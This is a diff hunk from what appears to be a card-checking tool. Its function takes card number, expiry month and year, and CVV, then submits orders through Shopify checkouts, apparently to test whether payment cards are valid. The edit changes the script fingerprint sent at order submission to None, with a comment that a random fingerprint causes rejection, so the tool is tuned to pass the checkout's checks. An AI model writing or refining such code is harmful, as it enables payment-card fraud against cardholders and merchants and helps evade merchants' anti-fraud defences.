@@ -568,9 +568,9 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
             'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True,
         }
 
-    # Extract real script fingerprint from checkout page
-    real_fingerprint = _extract_script_fingerprint(text)
-    submit_fingerprint = real_fingerprint if real_fingerprint else _generate_script_fingerprint()
+    # Use None for script fingerprint — Shopify's new checkout doesn't require it
+    # Sending a random fingerprint causes ARTIFACT_DISSATISFACTION
+    submit_fingerprint = None
 
     # Step 7: Submit order
     submit_merch = {'stableId': stable_id, 'merchandise': merch_block['merchandise'], 'quantity': {'items': {'value': 1}}, 'expectedTotalPrice': {'any': True}, 'lineComponentsSource': None, 'lineComponents': []}
